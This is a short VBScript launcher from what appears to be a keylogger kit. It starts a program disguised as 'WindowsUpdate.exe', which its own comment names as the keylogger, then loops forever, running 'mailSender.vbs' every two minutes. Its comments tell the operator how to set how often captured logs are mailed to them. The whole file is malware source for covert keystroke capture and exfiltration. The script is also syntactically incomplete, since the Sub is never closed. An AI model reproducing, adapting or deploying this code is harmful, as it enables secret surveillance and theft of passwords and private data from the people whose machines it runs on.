Sub startScript()
    Set shell=CreateObject("WScript.Shell") 'Sets the shell
    shell.Run "WindowsUpdate.exe" 'Starts the keylogger
    do 
    WScript.Sleep(120000) 'Waits 2 minutes before sending each mail, 1000 = 1 second, change this according to how often you want logs to be sent to you.
    shell.Run "mailSender.vbs" 'Starts mailsender.vbs'
    loop 'End of loop
    
startScript()